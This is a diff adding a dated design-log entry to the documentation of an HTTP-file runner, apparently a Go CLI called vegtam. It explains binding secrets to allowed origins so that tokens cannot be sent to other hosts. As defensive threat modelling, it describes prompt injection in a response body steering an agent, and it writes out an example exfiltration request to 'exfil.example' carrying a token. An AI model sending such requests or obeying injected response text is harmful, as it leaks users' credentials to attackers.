@@ -1240,3 +1240,105 @@ live in `internal/cli`; `cmd/vegtam` only wires up the process.
   since the previous tag, sorted, without those whose subject starts
   with `docs:`, `readme:` or `test:`: they change no behaviour.
   `readme:` is this repository's area for the README.
+
+## 2026-10-24: secrets have origins
+
+- **The threat.** A `.http` file and its `http-client.env.json` come
+  with the requests, often from someone else: a cloned repository, a
+  pulled change. A response can lead a program too, as a prompt
+  injection in a body that tells an agent to "now check this URL" does.
+  Either way, a request such as `GET https://exfil.example/c?t={{token}}`
+  is run, or the same with `{{$env TOKEN}}`, `{{$cmd TOKEN}}` or a
+  captured `{{session}}`. Until now the network guard let it pass, the
+  host being public; a GET needed no `--confirm`; and the masker hid the
+  value in the output while it went out on the wire. The guard says
+  what may be reached and masking what may be printed; nothing said
+  where a secret may go.
+- **Each secret has origins.** A secret may go to a set of origins,
+  `scheme://host[:port]` with the host in lower case and the scheme's
+  own port dropped, compared exactly. A request that would send one
+  elsewhere, in its URL, a header or its body, is not sent: no lookup,
+  no connection. The check is in one place in the core, before each
+  hop, so that `run`, the terminal interface and any new way to send
+  hold it alike. Basic credentials are two secrets, each checked on its
+  own.
+- **The requests' files bind nothing.** The `.http` file and the
+  public environment file are what the check is for: an `$allow` in
+  `http-client.env.json` is ignored with a warning, as its
+  `SSLConfiguration` is. The private environment file binds its values
+  with `$allow`, and the operator's policy, outside any repository,
+  binds `{{$env NAME}}` and `{{$cmd NAME}}` with `secrets`. A capture is
+  bound with nothing to declare, to the origin of the response it came
+  from: the server that gave the value may have it back, and no other;
+  in a dry run, which captures nothing, to the origin of the request
+  that would.
+- **A file binds only the values it holds.** The private file is found
+  from the directory of the `.http` file up, so a cloned repository can
+  bring an `http-client.private.env.json` of its own. One that does may
+  bind its own values anywhere: they are its author's, and it hides the
+  person's file above it, whose values are then not read. It must not
+  bind the person's environment variables or commands, which no file
+  holds: an `$allow` entry for `$env NAME` or `$cmd NAME` is ignored,
+  with a warning that names the entry of the policy to write. The first
+  design took the union of the two, the file's `$allow` and the
+  policy's `secrets`, as if both were always the person's. A union is
+  as wide as its widest part, and the private file is not always the
+  person's: through it, a repository could bind
+  `{{$env AWS_SECRET_ACCESS_KEY}}` to a host of its own and send it
+  there. So the policy alone binds what the machine holds, and the
+  refusal says which of the two to write, by the kind of the secret.
+- **Nowhere by default.** A secret bound to no origin goes nowhere.
+  "Anywhere" would keep every old setup working, and leave the hole
+  open for each secret that no one thought to bind. This breaks the
+  private files written before it, on purpose: the error names the
+  secret, the origin it would go to and the ones it may, and where to
+  bind it, so the fix is a line. The Postman import writes `$allow`
+  where the export makes the origin plain, and reports the rest.
+- **No confirmation without a person.** Without a person the refusal is
+  of kind `policy`, exit code 6, and `--confirm` does not lift it,
+  though it lifts a method or `@note`: the file or the response that
+  asked for the request leads the program, and a confirmation would
+  come from the same place. With a person at a terminal it is of kind
+  `confirm`, exit code 5, and `--confirm=<ref>` sends it, to the origin
+  of that request only, this once; the terminal interface asks, with the
+  secret and the origin in its question. The confirmation must name the
+  request: the person confirms this one, having seen what it sends and
+  where, while `--confirm` alone is given for a whole run before its
+  requests are seen. A ref with a comma, which `--confirm=<ref>` cannot
+  name, has no flag for it, though `--confirm` alone counts for such a
+  ref's `@note`: the files of a run may be someone else's to name, and
+  `x,y.http` would otherwise send its secrets on a run confirmed for its
+  methods.
+- **A Host header is an origin too.** A `Host` header that names
+  another host than the URL's sends the request, over the same
+  connection, to that host as far as the server is concerned: a CDN or
+  a shared server routes by it. So it is a second origin of the
+  request, over the URL's scheme, and each secret must be bound to both;
+  a value captured from such a request is bound to both.
+- **No implicit rules.** An origin is named whole. There are no
+  wildcards, and no rule such as "the origin of another private value"
+  or "the host of the base URL": each would be something that a file
+  from elsewhere could steer, with a `host` in the public file or a
+  subdomain under a wildcard. A list of origins is longer to write, and
+  says all it allows.
+- **Redirects with a secret in the URL.** On a change of origin, the
+  headers that hold a secret were already dropped, and a body that
+  holds one was not sent again. A URL cannot be dropped: a server that
+  passes its query on, as an open redirect does, would carry the token
+  to wherever it points. So a redirect to an origin that a secret in
+  the URL is not bound to is refused before that hop, as kind `policy`
+  in every mode: no person saw where it leads.
+- **A plain capture that echoes a secret.** `plain` is the file's word
+  that a value is no secret, and a response may echo the token in the
+  field it captures. A plain value that holds a known secret value, as
+  the masker finds it, is taken as that secret, bound to the origin of
+  the response, so that a capture cannot carry a token on under a name
+  of its own. A dry run sees no value, and takes a `plain` capture at
+  its word.
+- **Next: a keeper.** The values still pass through the process that a
+  program runs. The next step is a keeper, a process of the person's
+  that holds the secrets and asks before a use, as `ssh-agent -c` does
+  for keys, so that `vegtam run` under an agent never sees them. The
+  core keeps substitution, origins and the check behind one interface,
+  `core.Secrets` (`SecretValue` and `SecretOrigins`), for the keeper to
+  take its place.
